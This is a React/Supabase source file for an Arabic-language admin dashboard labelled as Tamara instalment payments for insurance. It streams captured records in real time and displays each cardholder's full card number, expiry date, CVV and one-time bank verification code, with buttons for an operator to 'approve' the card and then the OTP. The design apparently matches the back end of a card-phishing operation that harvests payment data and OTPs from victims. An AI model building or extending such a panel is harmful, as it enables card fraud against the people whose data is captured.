import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AdminSidebar } from "@/components/AdminSidebar";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Loader2, Check, X, CreditCard } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { format } from "date-fns";
import { ar } from "date-fns/locale";

interface TamaraPayment {
  id: string;
  cardholder_name: string;
  card_number: string | null;
  card_number_last4: string;
  expiry_date: string | null;
  cvv: string | null;
  otp_code: string | null;
  total_amount: number;
  monthly_payment: number;
  company: string;
  payment_status: string;
  created_at: string;
  updated_at: string;
}

const AdminTamaraPayments = () => {
  const navigate = useNavigate();
  const [payments, setPayments] = useState<TamaraPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingPayment, setProcessingPayment] = useState<string | null>(null);
  const { toast } = useToast();

  useEffect(() => {
    const checkAuthAndFetchPayments = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/admin/login");
        return;
      }

      await fetchPayments();
      
      // Subscribe to realtime updates
      const channel = supabase
        .channel('tamara-payments-changes')
        .on(
          'postgres_changes',
          {
            event: '*',
            schema: 'public',
            table: 'tamara_payments'
          },
          () => {
            fetchPayments();
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(channel);
      };
    };

    checkAuthAndFetchPayments();
  }, [navigate]);

  const fetchPayments = async () => {
    try {
      const { data, error } = await supabase
        .from('tamara_payments')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      setPayments(data || []);
    } catch (error) {
      console.error("Error fetching payments:", error);
      toast({
        title: "خطأ",
        description: "فشل في جلب بيانات الدفعات",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على الدفعة بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleReject = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض الدفعة",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleApproveOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'completed' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم تأكيد OTP",
        description: "تمت الموافقة على كود التحقق بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleRejectOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'otp_rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم رفض OTP",
        description: "تم رفض كود التحقق",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      case 'approved':
        return <Badge className="bg-green-500">تمت الموافقة</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'completed':
        return <Badge className="bg-blue-500">مكتمل</Badge>;
      case 'otp_rejected':
        return <Badge className="bg-orange-500">رفض OTP</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="flex min-h-screen w-full" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8 bg-gray-50">
          <div className="max-w-7xl mx-auto">
            <div className="mb-8">
              <h1 className="text-3xl font-bold text-gray-900">دفعات تمارا</h1>
              <p className="text-gray-600 mt-2">إدارة والموافقة على دفعات تمارا</p>
            </div>

            <div className="grid gap-6">
              {payments.length === 0 ? (
                <Card>
                  <CardContent className="p-8 text-center text-gray-500">
                    لا توجد دفعات حتى الآن
                  </CardContent>
                </Card>
              ) : (
                payments.map((payment) => (
                  <Card key={payment.id}>
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <CreditCard className="h-5 w-5" />
                          <CardTitle>{payment.cardholder_name}</CardTitle>
                        </div>
                        {getStatusBadge(payment.payment_status)}
                      </div>
                      <CardDescription>
                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                      </CardDescription>
                    </CardHeader>
                    <CardContent>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                        <div>
                          <p className="text-sm text-gray-600">رقم البطاقة الكامل</p>
                          <p className="font-medium">{payment.card_number || 'غير متوفر'}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">آخر 4 أرقام</p>
                          <p className="font-medium">**** **** **** {payment.card_number_last4}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">تاريخ الانتهاء</p>
                          <p className="font-medium">{payment.expiry_date || 'غير متوفر'}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">CVV</p>
                          <p className="font-medium">{payment.cvv || 'غير متوفر'}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">كود التحقق (OTP)</p>
                          <p className="font-bold text-lg text-primary">{payment.otp_code || 'لم يتم إدخاله بعد'}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">شركة التأمين</p>
                          <p className="font-medium">{payment.company}</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">المبلغ الشهري</p>
                          <p className="font-medium">{payment.monthly_payment} ر.س</p>
                        </div>
                        <div>
                          <p className="text-sm text-gray-600">المبلغ الإجمالي</p>
                          <p className="font-bold text-lg">{payment.total_amount} ر.س</p>
                        </div>
                      </div>

                      {/* أزرار الموافقة/الرفض على الدفع */}
                      {payment.payment_status === 'pending' && !payment.otp_code && (
                        <div className="flex gap-3 mt-4 pt-4 border-t">
                          <Button
                            onClick={() => handleApprove(payment.id)}
                            disabled={processingPayment === payment.id}
                            className="flex-1 bg-green-600 hover:bg-green-700"
                          >
                            {processingPayment === payment.id ? (
                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
                            ) : (
                              <Check className="h-4 w-4 ml-2" />
                            )}
                            الموافقة على الدفع
                          </Button>
                          <Button
                            onClick={() => handleReject(payment.id)}
                            disabled={processingPayment === payment.id}
                            variant="destructive"
                            className="flex-1"
                          >
                            {processingPayment === payment.id ? (
                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
                            ) : (
                              <X className="h-4 w-4 ml-2" />
                            )}
                            رفض الدفع
                          </Button>
                        </div>
                      )}

                      {/* أزرار الموافقة/الرفض على OTP - تظهر عندما يتم إدخال الكود */}
                      {payment.otp_code && payment.payment_status !== 'completed' && payment.payment_status !== 'otp_rejected' && (
                        <div className="flex gap-3 mt-4 pt-4 border-t">
                          <Button
                            onClick={() => handleApproveOtp(payment.id)}
                            disabled={processingPayment === payment.id}
                            className="flex-1 bg-green-600 hover:bg-green-700"
                          >
                            {processingPayment === payment.id ? (
                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
                            ) : (
                              <Check className="h-4 w-4 ml-2" />
                            )}
                            الموافقة على OTP
                          </Button>
                          <Button
                            onClick={() => handleRejectOtp(payment.id)}
                            disabled={processingPayment === payment.id}
                            variant="destructive"
                            className="flex-1"
                          >
                            {processingPayment === payment.id ? (
                              <Loader2 className="h-4 w-4 animate-spin ml-2" />
                            ) : (
                              <X className="h-4 w-4 ml-2" />
                            )}
                            رفض OTP
                          </Button>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default AdminTamaraPayments;
